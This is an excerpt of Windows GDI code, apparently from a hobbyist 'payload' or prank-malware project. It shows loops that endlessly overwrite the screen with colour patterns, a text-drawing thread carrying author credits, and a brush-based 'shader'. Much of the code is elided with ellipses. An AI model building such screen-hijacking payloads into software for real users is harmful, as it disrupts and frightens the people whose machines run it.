...
//	prgbScreen = {0};
	...
	for (int t = 0;; t++) {
		...
		for (int i = 0; i < w * h; i++) {
			...
			prgbScreen[i].rgb = (RGB((2 * r) % 266, (b + t) % 250, (g + i) % 253) + int(sqrt(i >> t / (r + 1))) / 10) % (RGB(100, 200, 500));
		}
		Sleep(100);
...
//	prgbScreen = {0};
	...
	for (int t = 0;; t++) {
		...
		BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			prgbScreen[i].rgb = (t * i) % (RGB(200, 355, 455));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCERASE);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}
...
DWORD WINAPI Payload2a_Textout(LPVOID lpParam) {
    ...
    int x = 10;
    int y = 10;
    LPCSTR lpText = "KielN17ProVenrsTchAndNticr by MazeIcon/Underwater Tiny Kong, MSAgentRocks324's Imposter, Jeremiah, User-VSGWABXCSEJEV & Trus Bus Rezky bogor OSC";
...
DWORD WINAPI GDIShader9(LPVOID lpParam) {
    ...
    while (1) {
        hdc = GetDC(NULL);
        HBRUSH hbr = CreateSolidBrush(Hue(rand() % 3000));
